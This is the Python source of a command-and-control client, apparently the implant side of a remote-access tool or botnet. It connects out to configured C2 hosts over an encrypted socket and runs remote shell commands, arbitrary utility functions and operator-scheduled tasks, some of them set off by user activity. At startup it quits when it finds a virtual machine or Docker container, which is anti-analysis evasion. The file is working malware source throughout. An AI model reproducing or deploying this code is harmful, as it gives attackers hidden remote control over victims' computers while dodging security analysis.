import sys
import json
import time
import queue
import socket
import struct
import logging
import threading

from infos import *
from config import *
from shell import Shell
from tasks import *

from utils import Logger, decrypt, encrypt, MessageEncoder, MessageDecoder, threaded, QueueHandler

HOST = '127.0.0.1'
PORT = 8192


class Client:
    """Bot thread manages socket IO.

    Args:
        readque (queue.Queue): Queue where client puts received data.
        writeque (queue.Queue): Queue from which client gets the data.
    """

    def __init__(self, readque: queue.Queue, writeque: queue.Queue):
        super(Client, self).__init__()
        self.logger = logging.getLogger(self.__class__.__name__)
        self.s = None

        self.threads = []
        self.writethr = None
        self.readthr = None
        self.connthr = None

        self.active = threading.Event()
        self.passive = threading.Event()
        self.key_change = threading.Event()

        self.key = C2_ENCRYPTION_KEY
        self.readque = readque
        self.writeque = writeque
        self.queue_handler = QueueHandler(self.writeque)

    def run(self):
        """Start connection thread."""
        self.connthr = threading.Thread(target=self.connect, args=(HOST, PORT,))
        self.connthr.daemon = False
        self.connthr.start()

    def connect(self, address, port):
        """Connect to C2 server."""
        while not self.active.is_set():
            for c2 in C2_HOSTS:
                try:
                    address, port = c2.get("ip"), c2.get("port")
                    self.s = socket.create_connection((address, port))
                    self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    self.logger.debug("Connected successfully to: {}".format(self.s.getpeername()))
                    self.active.set()
                    self.readthr = self.write()
                    self.writethr = self.read()
                    break

                except (socket.timeout, socket.error):
                    self.logger.debug("Unable to connect to {}:{}. Retrying in {} seconds...".format(address,
                                                                                                     port,
                                                                                                     C2_TIMEOUT))
                    time.sleep(C2_TIMEOUT)

                except Exception as e:
                    self.logger.error("Socket error while connecting to server: {}".format(str(e)))
                    try:
                        self.s.close()
                    except socket.error:
                        pass
                    self.active.clear()
                    continue

    @threaded
    def write(self):
        """Pick data from write queue and send it to C2 server."""
        self.logger.info("Started write thread!")
        logging.getLogger().addHandler(self.queue_handler)
        while self.active.is_set():
            if not self.writeque.empty():
                data = self.writeque.get()
                try:
                    if isinstance(data.get("result"), Exception):
                        data["result"] = str(data.get("result"))
                    data = json.dumps(data, cls=MessageEncoder).encode()

                    if self.key and self.key_change.is_set():
                        # encrypt assign response with original key
                        if C2_ENCRYPTION_KEY:
                            data = encrypt(data, C2_ENCRYPTION_KEY)
                        self.key_change.clear()

                    elif self.key:
                        data = encrypt(data, self.key)
                    data = struct.pack('!L', len(data)) + data

                except Exception as e:
                    self.logger.warning("Failed to serialize dict: {}".format(e))
                    continue

                self.s.sendall(data)
                # self.logger.debug("Sent data to {}: {}".format(self.s.getpeername(), data))
            time.sleep(0.5)
        logging.getLogger().removeHandler(self.queue_handler)
        self.logger.info("Stopped write thread!")

    @threaded
    def read(self):
        """Wait and receive data and put it to read queue."""
        self.logger.info("Started read thread!")
        while self.active.is_set():
            if self.key_change.is_set():
                continue
            header_size = struct.calcsize('!L')
            try:
                header = self.s.recv(header_size)
            except Exception as e:
                self.logger.warning("Socket error while reading data: {}".format(e))
                header = ""

            if len(header) == 4:
                msg_size = struct.unpack('!L', header)[0]
                data = self.s.recv(msg_size)
                if self.key:
                    data = decrypt(data, self.key)
                data = data.decode()
                try:
                    data = json.loads(data, cls=MessageDecoder)
                    self.readque.put(data)
                except json.JSONDecodeError as e:
                    self.logger.error("Failed to decode message {}: {}".format(data, e))
            else:
                try:
                    self.logger.info("Disconnected from {}".format(self.s.getpeername()))
                except OSError:
                    self.logger.info("Disconnected from server.")
                self.key = C2_ENCRYPTION_KEY
                self.active.clear()
                self.run()
            time.sleep(0.5)
        self.logger.info("Stopped read thread!")

    def stop(self):
        """Stop client and join threads."""
        try:
            self.s.close()
            self.active.clear()
            for t in self.threads:
                t.join()
                t.wait()
            self.logger.info("Client server closed successfully.")
            return 0
        except Exception as e:
            self.logger.error("Error while closing client: ".format(e))
            return 1

    def is_connected(self):
        """Check if client is active."""
        return self.active.is_set()

    def reconnect_to(self, host, port):
        """Reconnect to another C2 server."""
        self.stop()
        self.connect(host, port)

    def assign(self, key: str):
        """Assign negotiated encryption key and send response."""
        self.key_change.set()
        self.writeque.put({"event_type": "assign", "encryption_key": key})
        self.key = key.encode()


class Main:
    """Main class for client."""

    def __init__(self):
        super(Main, self).__init__()
        self.logger = logging.getLogger(self.__class__.__name__)

        self.client = None
        self.readque = queue.Queue()
        self.writeque = queue.Queue()
        self.running = threading.Event()

        self.shell = Shell()
        self.encryption_key = None
        self.tasks = []
        self.tasks_que = []

    def run(self):
        """Setup client and start read loop."""
        try:
            self.client = Client(self.readque, self.writeque)
            self.client.run()
            self.running.set()
        except Exception as e:
            self.logger.error("Failed to start client thread: {}".format(e))
            return 1

        while self.running.is_set():
            if self.client.is_connected():
                if not self.readque.empty():
                    data = self.readque.get()
                    event_type = data.get("event_type")

                    if event_type == "assign":
                        self.encryption_key = data.get("encryption_key")

                        if self.encryption_key:
                            self.client.assign(self.encryption_key)

                    elif event_type == "shell":
                        command = data.get("command")
                        resp = {"event_type": "shell", "event": "output"}
                        try:
                            command = str(command)
                            resp["output"] = getattr(self.shell, command)(*data.get("args"))
                            resp["exit_code"] = 0

                        except AttributeError:
                            resp["output"] = "Command not found"
                            resp["exit_code"] = 2

                        except Exception as e:
                            resp["output"] = "Failed to execute command {}: {}".format(command, e)
                            resp["exit_code"] = 1
                        self.writeque.put(resp)

                    elif event_type == "info":
                        # execute utility with matching name
                        info_list = data.get("info")
                        if type(info_list) is list:
                            resp = {"event_type": "info", "info": data.get("info"),
                                    "start_time": data.get("send_time"), "results": {}}
                            for info in info_list:
                                self.logger.info("Running utility {}/{}: {}".format(info_list.index(info)
                                                                                    + 1,
                                                                                    len(info_list), info))
                                try:
                                    resp["results"][info] = {}
                                    resp["results"][info]["result"] = globals()[info]()
                                    resp["results"][info]["exit_code"] = 0

                                except KeyError as e:
                                    self.logger.error(
                                        "Utility {} not imported or does not exist".format(info))
                                    resp["results"][info]["result"] = "KeyError: {}".format(str(e))
                                    resp["results"][info]["exit_code"] = 1

                                except Exception as e:
                                    self.logger.error(
                                        "Error while processing utility {}: {}".format(info, e))
                                    resp["results"][info]["result"] = "Exception: {}".format(str(e))
                                    resp["results"][info]["exit_code"] = 1

                            self.writeque.put(resp)

                    elif event_type == "task":
                        # process task
                        task = data.get("task")
                        task_id = data.get("task_id")
                        event = data.get("event")
                        kwargs = data.get("kwargs")
                        user_activity = data.get("user_activity")
                        if event == "start":
                            if task not in self.running_task_names():
                                try:
                                    task_obj = getattr(sys.modules[__name__], task)(task_id)
                                    task_obj.user_activity = user_activity
                                    task_obj.set_run_kwargs(kwargs)
                                    if not user_activity:
                                        thr = task_obj.start(kwargs)
                                        task_obj.set_thread(thr)
                                        self.writeque.put(
                                            {"event_type": "task", "task": task,
                                             "task_id": task_id, "state": "started"})
                                        self.tasks.append(task_obj)
                                    else:
                                        self.logger.info("Created user activity based task {}:{}".format(
                                            task_obj.id, task_obj.__class__.__name__))
                                        self.writeque.put(
                                            {"event_type": "task", "task": task,
                                             "task_id": task_id, "state": "queued"})
                                        self.tasks_que.append(task_obj)

                                except Exception as e:
                                    self.logger.error("Failed to start task {}: {}".format(task_id, e))
                                    self.writeque.put(
                                        {"event_type": "task", "task": task, "task_id": task_id,
                                         "state": "finished", "result": e, "exit_code": 1})
                        elif event == "get":
                            for task in self.tasks:
                                running = task.serialize()
                                running["event_type"] = "task"
                                self.writeque.put(running)
                        elif event == "stop":
                            self.stop_task(task_id)
                        elif event == "force_start":
                            self.force_start_task(task_id)

                    else:
                        self.logger.error("Failed to find matching event type for message: {}".format(data))
            else:
                # stop task, which should be run only when conneted
                for task in self.tasks:
                    if task.stop_if_disconnected:
                        task.stop()
                        task.join()

            self.check_for_finished_tasks()
            self.check_activity_based_tasks()
            time.sleep(0.5)

        self.close()

    def stop_task(self, task_id):
        for task in self.tasks_que:
            if task.id == task_id:
                self.tasks_que.remove(task)
                self.tasks.append(task)
                self.logger.info("Task {} removed from queue".format(task.id))
                return

        for task in self.tasks:
            if task.id == task_id:
                self.logger.debug("Trying to stop task {}".format(task.id))
                task.stop()
                self.logger.info("Stopping task {}...".format(task.id))
                return

    def force_start_task(self, task_id):
        for task in self.tasks_que:
            if task.id == task_id:
                self.tasks_que.remove(task)
                thr = task.start(task.run_kwargs)
                task.set_thread(thr)
                self.tasks.append(task)
                self.writeque.put(
                    {"event_type": "task", "task": task.__class__.__name__,
                     "task_id": task_id, "state": "started"})
                self.logger.info("Task {} force started".format(task.id))
                return

    def running_task_names(self):
        return [task.__class__.__name__ for task in self.tasks]

    def get_task_by_name(self, task_name):
        for task in self.tasks:
            if task.__name__ == task_name:
                return task

    def check_activity_based_tasks(self):
        analyzer = self.get_task_by_name("ActivityAnalyzer")
        if analyzer:
            for task in self.tasks_que:
                try:
                    if not task.was_started() and task.user_activity == analyzer.get_activity():
                        thr = task.start(task.run_kwargs)
                        task.set_thread(thr)
                        self.tasks_que.remove(task)
                        self.tasks.append(task)
                        self.writeque.put(
                            {"event_type": "task", "task": task.__class__.__name__,
                             "task_id": task.id, "state": "started"})
                        self.logger.info("Started user activity based task {}".format(task.__class__.__name__))
                except AttributeError:
                    pass

    def check_for_finished_tasks(self):
        for task in self.tasks:
            if not task.is_alive():
                result = task.join(0)
                if result is not None:
                    task.set_finished(result.get("result"), result.get("exit_code"))
                    if self.client.is_connected():
                        sendable = task.serialize()
                        self.writeque.put(sendable)
                        self.tasks.remove(task)

    def close(self):
        for task in self.tasks:
            task.join()
        sys.exit(self.client.stop())


if __name__ == '__main__':
    try:
        if not ALLOW_VM and is_running_in_vm() or not ALLOW_DOCKER and is_running_in_docker():
            sys.exit(0)
    except Exception:
        if not ALLOW_IF_VM_CHECK_FAILS:
            sys.exit(0)

    if STARTUP_DELAY:
        time.sleep(STARTUP_DELAY)

    log = Logger()
    log.enable()
    m = Main()
    m.run()
